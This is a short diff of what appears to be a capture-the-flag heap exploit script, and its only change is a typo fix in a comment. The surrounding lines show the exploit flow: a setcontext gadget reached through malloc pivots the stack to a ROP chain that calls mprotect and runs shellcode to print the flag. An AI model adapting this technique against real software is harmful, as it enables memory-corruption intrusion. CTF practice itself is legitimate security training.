@@ -416,7 +416,7 @@ start_addr = u64(setctx_payload[:8])
 print(f"START: {hex(start_addr)}")
 
 # Call to malloc triggers "JOP" to setcontext gadget, which pivots stack to rop chain,
-# which call mprotect and finally pivots to some shellcode to cat out the flag
+# which calls mprotect and finally pivots to some shellcode to cat out the flag
 alloc_note(io, 1, 0x100, "", clean=False)
 
 # Flag gets written out, along with a bunch of garbage
